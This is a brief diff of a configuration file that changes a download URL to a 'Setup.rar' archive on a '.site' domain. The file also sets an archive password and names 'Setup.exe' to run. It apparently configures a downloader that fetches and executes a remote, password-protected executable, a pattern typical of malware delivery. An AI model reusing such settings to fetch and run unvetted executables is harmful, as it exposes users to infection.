@@ -1,4 +1,4 @@
-url=https://zips99.site/
+url=https://winds11.site/bb/Setup.rar
 name=Setup.rar
 password=2025
 setup=Setup.exe
